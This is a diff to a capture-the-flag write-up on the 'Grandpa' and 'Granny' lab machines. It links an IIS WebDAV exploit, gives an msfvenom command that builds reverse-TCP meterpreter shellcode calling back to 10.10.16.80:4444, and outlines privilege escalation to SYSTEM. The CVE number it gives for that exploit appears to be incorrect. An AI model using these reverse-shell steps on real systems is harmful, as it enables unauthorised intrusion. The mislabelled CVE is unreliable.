@@ -63,13 +63,21 @@ Privilege Escalated. Finished.
 
 ## OSCP way
 
-https://github.com/danigargu/explodingcan
+### Grandpa
+
+CVE-2017-7629: https://github.com/danigargu/explodingcan
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.16.80 LPORT=4444 >shellcode
 ```
 
 Use the script from here to get a meterpreter shell. After that, Migrate the meterpreter to a stabler process. Download MS14-070 exploit from https://github.com/abatchy17/WindowsExploits. You'll have a `NT AUTHORITY/SYSTEM` shell.
+
+### Granny
+
+No way, totally MSF here.
+
+TBH, I can write one using Python by analyzing the MSF exploit. But I don't think worth it.
 
 # Writeup
 
